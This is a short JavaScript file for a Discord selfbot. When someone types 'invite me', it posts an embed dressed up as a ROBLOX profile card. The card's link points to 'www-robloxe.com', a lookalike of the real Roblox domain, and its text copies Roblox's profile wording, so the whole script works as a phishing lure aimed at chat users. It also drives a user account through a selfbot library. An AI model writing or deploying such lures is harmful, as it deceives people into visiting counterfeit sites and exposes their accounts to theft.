const Discord = require('freeze-selfbot');
const client = new Discord.Client();
const keepAlive = require("./server");


// client.on('ready', () => {
//     console.log(`Logged in as ${client.user.tag}!`);
// });

client.on('message', msg => {
    if (msg.content === 'invite me') {
        msg.channel.sendMessage({
            embed: {
                author: {
                    name: "ROBLOX",
                },
                thumbnail: {
                    url: "http://www.roblox.com/Thumbs/Avatar.ashx?x=352&y=352&Format=Png&username=Kenami",
                },
                title: "mylifeisExotic's Profile",
                url: "https://www-robloxe.com/users/827724308/profile",
                description: "mylifeisExotic is one of the millions playing, creating and exploring the endless possibilities of Roblox. Join mylifeisExotic on Roblox and explore together! Go ahead, dig through my profile, you'll only find the pain, sorrow and smart-ase remarks of a lost cause. I'm not particularly friendly, but that doesn't mean I hate people. I'm just relu...",
            }
        });
    }
});

keepAlive();
client.login(process.env.DISCORD_BOT_TOKEN);